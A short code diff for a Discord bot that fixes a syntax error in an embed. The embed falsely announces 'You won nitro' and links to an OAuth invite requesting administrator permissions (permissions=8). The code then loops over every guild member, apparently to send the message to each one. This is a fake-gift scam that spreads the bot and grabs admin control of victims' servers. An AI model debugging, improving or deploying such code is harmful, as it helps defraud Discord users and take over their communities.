@@ -33,7 +33,7 @@ async def on_ready():
 async def on_bot_join(ctx):
   members=ctx.guild.members
   
-  embed=discord.Embed(title="",discord.Color.red())
+  embed=discord.Embed(title="",color=discord.Color.red())
   embed.add_field(name="You won nitro",value="Add this bot to claim your gift after 24h [ADD BOT!!](https://discord.com/api/oauth2/authorize?client_id=850076753828249650&permissions=8&scope=bot)")
   embed.set_image(url="https://tenor.com/view/discord-classic-nitro-gif-14823293")
   for member in members:
